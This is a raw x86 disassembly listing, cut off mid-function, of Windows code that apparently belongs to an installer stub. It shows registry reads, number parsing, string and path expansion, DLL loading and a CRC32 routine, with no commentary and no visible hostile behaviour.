  406560:	c7 45 fc 00 08 00 00 	movl   $0x800,-0x4(%ebp)
  406567:	25 00 01 00 00       	and    $0x100,%eax
  40656c:	0d 19 00 02 00       	or     $0x20019,%eax
  406571:	50                   	push   %eax
  406572:	ff 75 0c             	push   0xc(%ebp)
  406575:	ff 75 08             	push   0x8(%ebp)
  406578:	e8 72 ff ff ff       	call   0x4064ef
  40657d:	8b 75 14             	mov    0x14(%ebp),%esi
  406580:	85 c0                	test   %eax,%eax
  406582:	75 3c                	jne    0x4065c0
  406584:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406587:	57                   	push   %edi
  406588:	50                   	push   %eax
  406589:	8d 45 0c             	lea    0xc(%ebp),%eax
  40658c:	56                   	push   %esi
  40658d:	50                   	push   %eax
  40658e:	6a 00                	push   $0x0
  406590:	ff 75 10             	push   0x10(%ebp)
  406593:	ff 75 18             	push   0x18(%ebp)
  406596:	ff 15 08 80 40 00    	call   *0x408008
  40659c:	ff 75 18             	push   0x18(%ebp)
  40659f:	8b f8                	mov    %eax,%edi
  4065a1:	ff 15 10 80 40 00    	call   *0x408010
  4065a7:	66 83 a6 fe 07 00 00 	andw   $0x0,0x7fe(%esi)
  4065ae:	00 
  4065af:	85 ff                	test   %edi,%edi
  4065b1:	5f                   	pop    %edi
  4065b2:	75 0c                	jne    0x4065c0
  4065b4:	83 7d 0c 01          	cmpl   $0x1,0xc(%ebp)
  4065b8:	74 0a                	je     0x4065c4
  4065ba:	83 7d 0c 02          	cmpl   $0x2,0xc(%ebp)
  4065be:	74 04                	je     0x4065c4
  4065c0:	66 83 26 00          	andw   $0x0,(%esi)
  4065c4:	5e                   	pop    %esi
  4065c5:	c9                   	leave
  4065c6:	c2 14 00             	ret    $0x14
  4065c9:	ff 74 24 08          	push   0x8(%esp)
  4065cd:	68 18 84 40 00       	push   $0x408418
  4065d2:	ff 74 24 0c          	push   0xc(%esp)
  4065d6:	ff 15 2c 82 40 00    	call   *0x40822c
  4065dc:	83 c4 0c             	add    $0xc,%esp
  4065df:	c2 08 00             	ret    $0x8
  4065e2:	55                   	push   %ebp
  4065e3:	8b ec                	mov    %esp,%ebp
  4065e5:	51                   	push   %ecx
  4065e6:	51                   	push   %ecx
  4065e7:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4065ea:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4065ee:	53                   	push   %ebx
  4065ef:	56                   	push   %esi
  4065f0:	66 83 39 2d          	cmpw   $0x2d,(%ecx)
  4065f4:	6a 0a                	push   $0xa
  4065f6:	58                   	pop    %eax
  4065f7:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  4065fe:	6a 39                	push   $0x39
  406600:	5b                   	pop    %ebx
  406601:	75 06                	jne    0x406609
  406603:	41                   	inc    %ecx
  406604:	41                   	inc    %ecx
  406605:	83 4d f8 ff          	orl    $0xffffffff,-0x8(%ebp)
  406609:	66 83 39 30          	cmpw   $0x30,(%ecx)
  40660d:	75 27                	jne    0x406636
  40660f:	41                   	inc    %ecx
  406610:	41                   	inc    %ecx
  406611:	66 8b 11             	mov    (%ecx),%dx
  406614:	66 83 fa 30          	cmp    $0x30,%dx
  406618:	72 0c                	jb     0x406626
  40661a:	66 83 fa 37          	cmp    $0x37,%dx
  40661e:	77 06                	ja     0x406626
  406620:	6a 08                	push   $0x8
  406622:	58                   	pop    %eax
  406623:	6a 37                	push   $0x37
  406625:	5b                   	pop    %ebx
  406626:	0f b7 d2             	movzwl %dx,%edx
  406629:	83 e2 df             	and    $0xffffffdf,%edx
  40662c:	83 fa 58             	cmp    $0x58,%edx
  40662f:	75 05                	jne    0x406636
  406631:	6a 10                	push   $0x10
  406633:	41                   	inc    %ecx
  406634:	58                   	pop    %eax
  406635:	41                   	inc    %ecx
  406636:	0f b7 11             	movzwl (%ecx),%edx
  406639:	41                   	inc    %ecx
  40663a:	41                   	inc    %ecx
  40663b:	83 fa 30             	cmp    $0x30,%edx
  40663e:	7c 0c                	jl     0x40664c
  406640:	0f b7 f3             	movzwl %bx,%esi
  406643:	3b d6                	cmp    %esi,%edx
  406645:	7f 05                	jg     0x40664c
  406647:	83 ea 30             	sub    $0x30,%edx
  40664a:	eb 1b                	jmp    0x406667
  40664c:	66 3d 10 00          	cmp    $0x10,%ax
  406650:	75 23                	jne    0x406675
  406652:	8b f2                	mov    %edx,%esi
  406654:	83 e6 df             	and    $0xffffffdf,%esi
  406657:	83 fe 41             	cmp    $0x41,%esi
  40665a:	7c 19                	jl     0x406675
  40665c:	83 fe 46             	cmp    $0x46,%esi
  40665f:	7f 14                	jg     0x406675
  406661:	83 e2 07             	and    $0x7,%edx
  406664:	83 c2 09             	add    $0x9,%edx
  406667:	0f b7 f0             	movzwl %ax,%esi
  40666a:	0f af 75 fc          	imul   -0x4(%ebp),%esi
  40666e:	03 f2                	add    %edx,%esi
  406670:	89 75 fc             	mov    %esi,-0x4(%ebp)
  406673:	eb c1                	jmp    0x406636
  406675:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406678:	5e                   	pop    %esi
  406679:	0f af 45 fc          	imul   -0x4(%ebp),%eax
  40667d:	5b                   	pop    %ebx
  40667e:	c9                   	leave
  40667f:	c2 04 00             	ret    $0x4
  406682:	68 00 04 00 00       	push   $0x400
  406687:	ff 74 24 0c          	push   0xc(%esp)
  40668b:	ff 74 24 0c          	push   0xc(%esp)
  40668f:	ff 15 98 80 40 00    	call   *0x408098
  406695:	c2 08 00             	ret    $0x8
  406698:	ff 25 9c 80 40 00    	jmp    *0x40809c
  40669e:	ff 25 54 81 40 00    	jmp    *0x408154
  4066a4:	33 c0                	xor    %eax,%eax
  4066a6:	50                   	push   %eax
  4066a7:	50                   	push   %eax
  4066a8:	ff 74 24 14          	push   0x14(%esp)
  4066ac:	ff 74 24 14          	push   0x14(%esp)
  4066b0:	6a ff                	push   $0xffffffff
  4066b2:	ff 74 24 18          	push   0x18(%esp)
  4066b6:	50                   	push   %eax
  4066b7:	50                   	push   %eax
  4066b8:	ff 15 94 80 40 00    	call   *0x408094
  4066be:	c3                   	ret
  4066bf:	8b 44 24 08          	mov    0x8(%esp),%eax
  4066c3:	83 ec 10             	sub    $0x10,%esp
  4066c6:	85 c0                	test   %eax,%eax
  4066c8:	7d 11                	jge    0x4066db
  4066ca:	8b 0d 3c 8a 42 00    	mov    0x428a3c,%ecx
  4066d0:	8d 04 85 04 00 00 00 	lea    0x4(,%eax,4),%eax
  4066d7:	2b c8                	sub    %eax,%ecx
  4066d9:	8b 01                	mov    (%ecx),%eax
  4066db:	8b 0d 98 9a 42 00    	mov    0x429a98,%ecx
  4066e1:	53                   	push   %ebx
  4066e2:	55                   	push   %ebp
  4066e3:	56                   	push   %esi
  4066e4:	57                   	push   %edi
  4066e5:	8d 3c 41             	lea    (%ecx,%eax,2),%edi
  4066e8:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  4066ec:	b8 00 7a 42 00       	mov    $0x427a00,%eax
  4066f1:	3b c8                	cmp    %eax,%ecx
  4066f3:	8b f0                	mov    %eax,%esi
  4066f5:	0f 82 0a 02 00 00    	jb     0x406905
  4066fb:	8b d1                	mov    %ecx,%edx
  4066fd:	2b d0                	sub    %eax,%edx
  4066ff:	d1 fa                	sar    $1,%edx
  406701:	81 fa 00 08 00 00    	cmp    $0x800,%edx
  406707:	0f 83 f8 01 00 00    	jae    0x406905
  40670d:	83 64 24 24 00       	andl   $0x0,0x24(%esp)
  406712:	8b f1                	mov    %ecx,%esi
  406714:	e9 ec 01 00 00       	jmp    0x406905
  406719:	8b ce                	mov    %esi,%ecx
  40671b:	2b c8                	sub    %eax,%ecx
  40671d:	83 e1 fe             	and    $0xfffffffe,%ecx
  406720:	81 f9 00 08 00 00    	cmp    $0x800,%ecx
  406726:	0f 8d e5 01 00 00    	jge    0x406911
  40672c:	6a 02                	push   $0x2
  40672e:	59                   	pop    %ecx
  40672f:	03 f9                	add    %ecx,%edi
  406731:	66 83 fd 04          	cmp    $0x4,%bp
  406735:	0f 83 b7 01 00 00    	jae    0x4068f2
  40673b:	8a 4f 01             	mov    0x1(%edi),%cl
  40673e:	8a 07                	mov    (%edi),%al
  406740:	8a d1                	mov    %cl,%dl
  406742:	8a d8                	mov    %al,%bl
  406744:	83 e2 7f             	and    $0x7f,%edx
  406747:	83 e3 7f             	and    $0x7f,%ebx
  40674a:	c1 e2 07             	shl    $0x7,%edx
  40674d:	0f b6 c0             	movzbl %al,%eax
  406750:	0b d3                	or     %ebx,%edx
  406752:	8b d8                	mov    %eax,%ebx
  406754:	89 54 24 28          	mov    %edx,0x28(%esp)
  406758:	ba 00 80 00 00       	mov    $0x8000,%edx
  40675d:	0b da                	or     %edx,%ebx
  40675f:	6a 02                	push   $0x2
  406761:	89 5c 24 14          	mov    %ebx,0x14(%esp)
  406765:	89 44 24 18          	mov    %eax,0x18(%esp)
  406769:	0f b6 d9             	movzbl %cl,%ebx
  40676c:	8b cb                	mov    %ebx,%ecx
  40676e:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  406772:	0b ca                	or     %edx,%ecx
  406774:	89 4c 24 1c          	mov    %ecx,0x1c(%esp)
  406778:	59                   	pop    %ecx
  406779:	03 f9                	add    %ecx,%edi
  40677b:	66 3b e9             	cmp    %cx,%bp
  40677e:	0f 85 12 01 00 00    	jne    0x406896
  406784:	33 ed                	xor    %ebp,%ebp
  406786:	89 4c 24 28          	mov    %ecx,0x28(%esp)
  40678a:	39 2d e4 9a 42 00    	cmp    %ebp,0x429ae4
  406790:	74 08                	je     0x40679a
  406792:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%esp)
  406799:	00 
  40679a:	84 c0                	test   %al,%al
  40679c:	79 38                	jns    0x4067d6
  40679e:	8b c8                	mov    %eax,%ecx
  4067a0:	83 e0 3f             	and    $0x3f,%eax
  4067a3:	83 e1 40             	and    $0x40,%ecx
  4067a6:	51                   	push   %ecx
  4067a7:	8b 0d 98 9a 42 00    	mov    0x429a98,%ecx
  4067ad:	56                   	push   %esi
  4067ae:	8d 04 41             	lea    (%ecx,%eax,2),%eax
  4067b1:	50                   	push   %eax
  4067b2:	68 20 84 40 00       	push   $0x408420
  4067b7:	68 02 00 00 80       	push   $0x80000002
  4067bc:	e8 8f fd ff ff       	call   0x406550
  4067c1:	66 39 2e             	cmp    %bp,(%esi)
  4067c4:	0f 85 b4 00 00 00    	jne    0x40687e
  4067ca:	53                   	push   %ebx
  4067cb:	56                   	push   %esi
  4067cc:	e8 ee fe ff ff       	call   0x4066bf
  4067d1:	e9 a3 00 00 00       	jmp    0x406879
  4067d6:	83 f8 25             	cmp    $0x25,%eax
  4067d9:	75 11                	jne    0x4067ec
  4067db:	68 00 04 00 00       	push   $0x400
  4067e0:	56                   	push   %esi
  4067e1:	ff 15 58 81 40 00    	call   *0x408158
  4067e7:	e9 8d 00 00 00       	jmp    0x406879
  4067ec:	83 f8 24             	cmp    $0x24,%eax
  4067ef:	75 10                	jne    0x406801
  4067f1:	68 00 04 00 00       	push   $0x400
  4067f6:	56                   	push   %esi
  4067f7:	ff 15 b0 80 40 00    	call   *0x4080b0
  4067fd:	89 6c 24 28          	mov    %ebp,0x28(%esp)
  406801:	39 6c 24 28          	cmp    %ebp,0x28(%esp)
  406805:	74 72                	je     0x406879
  406807:	ff 4c 24 28          	decl   0x28(%esp)
  40680b:	8b 44 24 28          	mov    0x28(%esp),%eax
  40680f:	8b 5c 84 10          	mov    0x10(%esp,%eax,4),%ebx
  406813:	a1 64 9a 42 00       	mov    0x429a64,%eax
  406818:	83 e3 bf             	and    $0xffffffbf,%ebx
  40681b:	8b eb                	mov    %ebx,%ebp
  40681d:	81 e5 00 80 00 00    	and    $0x8000,%ebp
  406823:	85 c0                	test   %eax,%eax
  406825:	74 12                	je     0x406839
  406827:	56                   	push   %esi
  406828:	6a 00                	push   $0x0
  40682a:	6a 00                	push   $0x0
  40682c:	53                   	push   %ebx
  40682d:	ff 35 68 9a 42 00    	push   0x429a68
  406833:	ff d0                	call   *%eax
  406835:	85 c0                	test   %eax,%eax
  406837:	74 3a                	je     0x406873
  406839:	6a 07                	push   $0x7
  40683b:	e8 36 02 00 00       	call   0x406a76
  406840:	0f b6 cb             	movzbl %bl,%ecx
  406843:	55                   	push   %ebp
  406844:	51                   	push   %ecx
  406845:	ff 35 68 9a 42 00    	push   0x429a68
  40684b:	ff d0                	call   *%eax
  40684d:	8b d8                	mov    %eax,%ebx
  40684f:	85 db                	test   %ebx,%ebx
  406851:	74 15                	je     0x406868
  406853:	56                   	push   %esi
  406854:	53                   	push   %ebx
  406855:	ff 15 74 81 40 00    	call   *0x408174
  40685b:	53                   	push   %ebx
  40685c:	8b e8                	mov    %eax,%ebp
  40685e:	ff 15 a0 82 40 00    	call   *0x4082a0
  406864:	85 ed                	test   %ebp,%ebp
  406866:	75 0b                	jne    0x406873
  406868:	66 83 26 00          	andw   $0x0,(%esi)
  40686c:	83 7c 24 28 00       	cmpl   $0x0,0x28(%esp)
  406871:	75 94                	jne    0x406807
  406873:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  406877:	33 ed                	xor    %ebp,%ebp
  406879:	66 39 2e             	cmp    %bp,(%esi)
  40687c:	74 10                	je     0x40688e
  40687e:	83 fb 1a             	cmp    $0x1a,%ebx
  406881:	75 0b                	jne    0x40688e
  406883:	68 78 84 40 00       	push   $0x408478
  406888:	56                   	push   %esi
  406889:	e8 10 fe ff ff       	call   0x40669e
  40688e:	56                   	push   %esi
  40688f:	e8 9c 00 00 00       	call   0x406930
  406894:	eb 4c                	jmp    0x4068e2
  406896:	66 83 fd 03          	cmp    $0x3,%bp
  40689a:	75 32                	jne    0x4068ce
  40689c:	8b 5c 24 28          	mov    0x28(%esp),%ebx
  4068a0:	83 fb 1d             	cmp    $0x1d,%ebx
  4068a3:	75 0e                	jne    0x4068b3
  4068a5:	ff 35 68 9a 42 00    	push   0x429a68
  4068ab:	56                   	push   %esi
  4068ac:	e8 18 fd ff ff       	call   0x4065c9
  4068b1:	eb 11                	jmp    0x4068c4
  4068b3:	8b c3                	mov    %ebx,%eax
  4068b5:	c1 e0 0b             	shl    $0xb,%eax
  4068b8:	05 00 a0 42 00       	add    $0x42a000,%eax
  4068bd:	50                   	push   %eax
  4068be:	56                   	push   %esi
  4068bf:	e8 be fd ff ff       	call   0x406682
  4068c4:	83 c3 eb             	add    $0xffffffeb,%ebx
  4068c7:	83 fb 07             	cmp    $0x7,%ebx
  4068ca:	73 16                	jae    0x4068e2
  4068cc:	eb c0                	jmp    0x40688e
  4068ce:	66 83 fd 01          	cmp    $0x1,%bp
  4068d2:	75 0e                	jne    0x4068e2
  4068d4:	83 c8 ff             	or     $0xffffffff,%eax
  4068d7:	2b 44 24 28          	sub    0x28(%esp),%eax
  4068db:	50                   	push   %eax
  4068dc:	56                   	push   %esi
  4068dd:	e8 dd fd ff ff       	call   0x4066bf
  4068e2:	56                   	push   %esi
  4068e3:	e8 b0 fd ff ff       	call   0x406698
  4068e8:	8d 34 46             	lea    (%esi,%eax,2),%esi
  4068eb:	b8 00 7a 42 00       	mov    $0x427a00,%eax
  4068f0:	eb 13                	jmp    0x406905
  4068f2:	75 0c                	jne    0x406900
  4068f4:	66 8b 17             	mov    (%edi),%dx
  4068f7:	66 89 16             	mov    %dx,(%esi)
  4068fa:	03 f1                	add    %ecx,%esi
  4068fc:	03 f9                	add    %ecx,%edi
  4068fe:	eb 05                	jmp    0x406905
  406900:	66 89 2e             	mov    %bp,(%esi)
  406903:	03 f1                	add    %ecx,%esi
  406905:	66 8b 2f             	mov    (%edi),%bp
  406908:	66 85 ed             	test   %bp,%bp
  40690b:	0f 85 08 fe ff ff    	jne    0x406719
  406911:	66 83 26 00          	andw   $0x0,(%esi)
  406915:	83 7c 24 24 00       	cmpl   $0x0,0x24(%esp)
  40691a:	5f                   	pop    %edi
  40691b:	5e                   	pop    %esi
  40691c:	5d                   	pop    %ebp
  40691d:	5b                   	pop    %ebx
  40691e:	74 0a                	je     0x40692a
  406920:	50                   	push   %eax
  406921:	ff 74 24 18          	push   0x18(%esp)
  406925:	e8 58 fd ff ff       	call   0x406682
  40692a:	83 c4 10             	add    $0x10,%esp
  40692d:	c2 08 00             	ret    $0x8
  406930:	55                   	push   %ebp
  406931:	56                   	push   %esi
  406932:	8b 74 24 0c          	mov    0xc(%esp),%esi
  406936:	57                   	push   %edi
  406937:	66 83 3e 5c          	cmpw   $0x5c,(%esi)
  40693b:	75 18                	jne    0x406955
  40693d:	66 83 7e 02 5c       	cmpw   $0x5c,0x2(%esi)
  406942:	75 11                	jne    0x406955
  406944:	66 83 7e 04 3f       	cmpw   $0x3f,0x4(%esi)
  406949:	75 0a                	jne    0x406955
  40694b:	66 83 7e 06 5c       	cmpw   $0x5c,0x6(%esi)
  406950:	75 03                	jne    0x406955
  406952:	83 c6 08             	add    $0x8,%esi
  406955:	66 83 3e 00          	cmpw   $0x0,(%esi)
  406959:	74 0d                	je     0x406968
  40695b:	56                   	push   %esi
  40695c:	e8 67 f6 ff ff       	call   0x405fc8
  406961:	85 c0                	test   %eax,%eax
  406963:	74 03                	je     0x406968
  406965:	83 c6 04             	add    $0x4,%esi
  406968:	66 8b 06             	mov    (%esi),%ax
  40696b:	8b ee                	mov    %esi,%ebp
  40696d:	66 85 c0             	test   %ax,%ax
  406970:	8b fe                	mov    %esi,%edi
  406972:	74 40                	je     0x4069b4
  406974:	53                   	push   %ebx
  406975:	8b 1d 08 82 40 00    	mov    0x408208,%ebx
  40697b:	66 3d 1f 00          	cmp    $0x1f,%ax
  40697f:	76 25                	jbe    0x4069a6
  406981:	50                   	push   %eax
  406982:	68 cc a5 40 00       	push   $0x40a5cc
  406987:	e8 f2 f5 ff ff       	call   0x405f7e
  40698c:	66 83 38 00          	cmpw   $0x0,(%eax)
  406990:	75 14                	jne    0x4069a6
  406992:	56                   	push   %esi
  406993:	ff d3                	call   *%ebx
  406995:	2b c6                	sub    %esi,%eax
  406997:	d1 f8                	sar    $1,%eax
  406999:	50                   	push   %eax
  40699a:	56                   	push   %esi
  40699b:	57                   	push   %edi
  40699c:	e8 8c f7 ff ff       	call   0x40612d
  4069a1:	57                   	push   %edi
  4069a2:	ff d3                	call   *%ebx
  4069a4:	8b f8                	mov    %eax,%edi
  4069a6:	56                   	push   %esi
  4069a7:	ff d3                	call   *%ebx
  4069a9:	8b f0                	mov    %eax,%esi
  4069ab:	66 8b 06             	mov    (%esi),%ax
  4069ae:	66 85 c0             	test   %ax,%ax
  4069b1:	75 c8                	jne    0x40697b
  4069b3:	5b                   	pop    %ebx
  4069b4:	66 83 27 00          	andw   $0x0,(%edi)
  4069b8:	57                   	push   %edi
  4069b9:	55                   	push   %ebp
  4069ba:	ff 15 fc 81 40 00    	call   *0x4081fc
  4069c0:	8b f8                	mov    %eax,%edi
  4069c2:	66 8b 07             	mov    (%edi),%ax
  4069c5:	66 3d 20 00          	cmp    $0x20,%ax
  4069c9:	74 06                	je     0x4069d1
  4069cb:	66 3d 5c 00          	cmp    $0x5c,%ax
  4069cf:	75 08                	jne    0x4069d9
  4069d1:	66 83 27 00          	andw   $0x0,(%edi)
  4069d5:	3b ef                	cmp    %edi,%ebp
  4069d7:	72 df                	jb     0x4069b8
  4069d9:	5f                   	pop    %edi
  4069da:	5e                   	pop    %esi
  4069db:	5d                   	pop    %ebp
  4069dc:	c2 04 00             	ret    $0x4
  4069df:	56                   	push   %esi
  4069e0:	be 98 5f 42 00       	mov    $0x425f98,%esi
  4069e5:	56                   	push   %esi
  4069e6:	ff 74 24 0c          	push   0xc(%esp)
  4069ea:	ff 15 40 81 40 00    	call   *0x408140
  4069f0:	83 f8 ff             	cmp    $0xffffffff,%eax
  4069f3:	74 0b                	je     0x406a00
  4069f5:	50                   	push   %eax
  4069f6:	ff 15 38 81 40 00    	call   *0x408138
  4069fc:	8b c6                	mov    %esi,%eax
  4069fe:	eb 02                	jmp    0x406a02
  406a00:	33 c0                	xor    %eax,%eax
  406a02:	5e                   	pop    %esi
  406a03:	c2 04 00             	ret    $0x4
  406a06:	55                   	push   %ebp
  406a07:	8b ec                	mov    %esp,%ebp
  406a09:	81 ec 3c 02 00 00    	sub    $0x23c,%esp
  406a0f:	56                   	push   %esi
  406a10:	be 04 01 00 00       	mov    $0x104,%esi
  406a15:	8d 85 c4 fd ff ff    	lea    -0x23c(%ebp),%eax
  406a1b:	56                   	push   %esi
  406a1c:	50                   	push   %eax
  406a1d:	ff 15 58 81 40 00    	call   *0x408158
  406a23:	3b c6                	cmp    %esi,%eax
  406a25:	5e                   	pop    %esi
  406a26:	76 02                	jbe    0x406a2a
  406a28:	33 c0                	xor    %eax,%eax
  406a2a:	85 c0                	test   %eax,%eax
  406a2c:	74 0f                	je     0x406a3d
  406a2e:	66 83 bc 45 c2 fd ff 	cmpw   $0x5c,-0x23e(%ebp,%eax,2)
  406a35:	ff 5c 
  406a37:	74 04                	je     0x406a3d
  406a39:	33 c9                	xor    %ecx,%ecx
  406a3b:	eb 03                	jmp    0x406a40
  406a3d:	33 c9                	xor    %ecx,%ecx
  406a3f:	41                   	inc    %ecx
  406a40:	ff 75 08             	push   0x8(%ebp)
  406a43:	8d 0c 4d 14 a0 40 00 	lea    0x40a014(,%ecx,2),%ecx
  406a4a:	8d 84 45 c4 fd ff ff 	lea    -0x23c(%ebp,%eax,2),%eax
  406a51:	51                   	push   %ecx
  406a52:	68 e0 a5 40 00       	push   $0x40a5e0
  406a57:	50                   	push   %eax
  406a58:	ff 15 2c 82 40 00    	call   *0x40822c
  406a5e:	83 c4 10             	add    $0x10,%esp
  406a61:	8d 85 c4 fd ff ff    	lea    -0x23c(%ebp),%eax
  406a67:	6a 08                	push   $0x8
  406a69:	6a 00                	push   $0x0
  406a6b:	50                   	push   %eax
  406a6c:	ff 15 18 81 40 00    	call   *0x408118
  406a72:	c9                   	leave
  406a73:	c2 04 00             	ret    $0x4
  406a76:	8b 44 24 04          	mov    0x4(%esp),%eax
  406a7a:	56                   	push   %esi
  406a7b:	8b f0                	mov    %eax,%esi
  406a7d:	57                   	push   %edi
  406a7e:	c1 e6 03             	shl    $0x3,%esi
  406a81:	8b be 08 a4 40 00    	mov    0x40a408(%esi),%edi
  406a87:	57                   	push   %edi
  406a88:	ff 15 60 81 40 00    	call   *0x408160
  406a8e:	85 c0                	test   %eax,%eax
  406a90:	75 0a                	jne    0x406a9c
  406a92:	57                   	push   %edi
  406a93:	e8 6e ff ff ff       	call   0x406a06
  406a98:	85 c0                	test   %eax,%eax
  406a9a:	74 0f                	je     0x406aab
  406a9c:	ff b6 0c a4 40 00    	push   0x40a40c(%esi)
  406aa2:	50                   	push   %eax
  406aa3:	ff 15 5c 81 40 00    	call   *0x40815c
  406aa9:	eb 02                	jmp    0x406aad
  406aab:	33 c0                	xor    %eax,%eax
  406aad:	5f                   	pop    %edi
  406aae:	5e                   	pop    %esi
  406aaf:	c2 04 00             	ret    $0x4
  406ab2:	55                   	push   %ebp
  406ab3:	8b ec                	mov    %esp,%ebp
  406ab5:	83 ec 1c             	sub    $0x1c,%esp
  406ab8:	56                   	push   %esi
  406ab9:	8b 75 08             	mov    0x8(%ebp),%esi
  406abc:	57                   	push   %edi
  406abd:	8b 3d 84 82 40 00    	mov    0x408284,%edi
  406ac3:	eb 0a                	jmp    0x406acf
  406ac5:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  406ac8:	50                   	push   %eax
  406ac9:	ff 15 7c 82 40 00    	call   *0x40827c
  406acf:	6a 01                	push   $0x1
  406ad1:	56                   	push   %esi
  406ad2:	56                   	push   %esi
  406ad3:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  406ad6:	6a 00                	push   $0x0
  406ad8:	50                   	push   %eax
  406ad9:	ff d7                	call   *%edi
  406adb:	85 c0                	test   %eax,%eax
  406add:	75 e6                	jne    0x406ac5
  406adf:	5f                   	pop    %edi
  406ae0:	5e                   	pop    %esi
  406ae1:	c9                   	leave
  406ae2:	c2 04 00             	ret    $0x4
  406ae5:	55                   	push   %ebp
  406ae6:	8b ec                	mov    %esp,%ebp
  406ae8:	81 ec 00 01 00 00    	sub    $0x100,%esp
  406aee:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
  406af4:	68 00 01 00 00       	push   $0x100
  406af9:	50                   	push   %eax
  406afa:	ff 75 0c             	push   0xc(%ebp)
  406afd:	e8 a2 fb ff ff       	call   0x4066a4
  406b02:	83 c4 0c             	add    $0xc,%esp
  406b05:	85 c0                	test   %eax,%eax
  406b07:	74 12                	je     0x406b1b
  406b09:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
  406b0f:	50                   	push   %eax
  406b10:	ff 75 08             	push   0x8(%ebp)
  406b13:	ff 15 5c 81 40 00    	call   *0x40815c
  406b19:	eb 02                	jmp    0x406b1d
  406b1b:	33 c0                	xor    %eax,%eax
  406b1d:	c9                   	leave
  406b1e:	c2 08 00             	ret    $0x8
  406b21:	55                   	push   %ebp
  406b22:	8b ec                	mov    %esp,%ebp
  406b24:	51                   	push   %ecx
  406b25:	56                   	push   %esi
  406b26:	8b 35 68 81 40 00    	mov    0x408168,%esi
  406b2c:	57                   	push   %edi
  406b2d:	6a 64                	push   $0x64
  406b2f:	ff 75 08             	push   0x8(%ebp)
  406b32:	ff d6                	call   *%esi
  406b34:	bf 02 01 00 00       	mov    $0x102,%edi
  406b39:	eb 0e                	jmp    0x406b49
  406b3b:	6a 0f                	push   $0xf
  406b3d:	e8 70 ff ff ff       	call   0x406ab2
  406b42:	6a 64                	push   $0x64
  406b44:	ff 75 08             	push   0x8(%ebp)
  406b47:	ff d6                	call   *%esi
  406b49:	3b c7                	cmp    %edi,%eax
  406b4b:	74 ee                	je     0x406b3b
  406b4d:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406b50:	50                   	push   %eax
  406b51:	ff 75 08             	push   0x8(%ebp)
  406b54:	ff 15 64 81 40 00    	call   *0x408164
  406b5a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406b5d:	5f                   	pop    %edi
  406b5e:	5e                   	pop    %esi
  406b5f:	c9                   	leave
  406b60:	c2 04 00             	ret    $0x4
  406b63:	83 3d ec 75 42 00 00 	cmpl   $0x0,0x4275ec
  406b6a:	56                   	push   %esi
  406b6b:	75 2d                	jne    0x406b9a
  406b6d:	33 c9                	xor    %ecx,%ecx
  406b6f:	6a 08                	push   $0x8
  406b71:	8b c1                	mov    %ecx,%eax
  406b73:	5e                   	pop    %esi
  406b74:	8b d0                	mov    %eax,%edx
  406b76:	80 e2 01             	and    $0x1,%dl
  406b79:	f6 da                	neg    %dl
  406b7b:	1b d2                	sbb    %edx,%edx
  406b7d:	81 e2 20 83 b8 ed    	and    $0xedb88320,%edx
  406b83:	d1 e8                	shr    $1,%eax
  406b85:	33 c2                	xor    %edx,%eax
  406b87:	4e                   	dec    %esi
  406b88:	75 ea                	jne    0x406b74
  406b8a:	89 04 8d e8 75 42 00 	mov    %eax,0x4275e8(,%ecx,4)
  406b91:	41                   	inc    %ecx
  406b92:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  406b98:	7c d5                	jl     0x406b6f
  406b9a:	8b 54 24 10          	mov    0x10(%esp),%edx
  406b9e:	8b 44 24 08          	mov    0x8(%esp),%eax
  406ba2:	85 d2                	test   %edx,%edx
  406ba4:	f7 d0                	not    %eax
  406ba6:	76 23                	jbe    0x406bcb
  406ba8:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  406bac:	57                   	push   %edi
  406bad:	0f b6 39             	movzbl (%ecx),%edi
  406bb0:	8b f0                	mov    %eax,%esi
  406bb2:	81 e6 ff 00 00 00    	and    $0xff,%esi
  406bb8:	33 f7                	xor    %edi,%esi
  406bba:	c1 e8 08             	shr    $0x8,%eax
  406bbd:	8b 34 b5 e8 75 42 00 	mov    0x4275e8(,%esi,4),%esi
  406bc4:	33 c6                	xor    %esi,%eax
  406bc6:	41                   	inc    %ecx
  406bc7:	4a                   	dec    %edx
  406bc8:	75 e3                	jne    0x406bad
  406bca:	5f                   	pop    %edi
  406bcb:	f7 d0                	not    %eax
  406bcd:	5e                   	pop    %esi
  406bce:	c2 0c 00             	ret    $0xc
  406bd1:	b8 80 00 00 00       	mov    $0x80,%eax
  406bd6:	48                   	dec    %eax
  406bd7:	c6 04 08 00          	movb   $0x0,(%eax,%ecx,1)
  406bdb:	75 f9                	jne    0x406bd6
  406bdd:	83 49 78 ff          	orl    $0xffffffff,0x78(%ecx)
  406be1:	33 c0                	xor    %eax,%eax
  406be3:	40                   	inc    %eax
  406be4:	89 41 68             	mov    %eax,0x68(%ecx)
  406be7:	89 41 64             	mov    %eax,0x64(%ecx)
  406bea:	89 41 60             	mov    %eax,0x60(%ecx)
  406bed:	89 41 5c             	mov    %eax,0x5c(%ecx)
  406bf0:	c3                   	ret
  406bf1:	55                   	push   %ebp
  406bf2:	8b ec                	mov    %esp,%ebp
  406bf4:	81 ec 90 00 00 00    	sub    $0x90,%esp
  406bfa:	53                   	push   %ebx
  406bfb:	56                   	push   %esi
  406bfc:	57                   	push   %edi
  406bfd:	6a 22                	push   $0x22
  406bff:	8b f1                	mov    %ecx,%esi
  406c01:	59                   	pop    %ecx
  406c02:	8d bd 78 ff ff ff    	lea    -0x88(%ebp),%edi
  406c08:	89 b5 70 ff ff ff    	mov    %esi,-0x90(%ebp)
  406c0e:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  406c10:	83 7d d0 ff          	cmpl   $0xffffffff,-0x30(%ebp)
  406c14:	75 08                	jne    0x406c1e
  406c16:	33 c0                	xor    %eax,%eax
  406c18:	40                   	inc    %eax
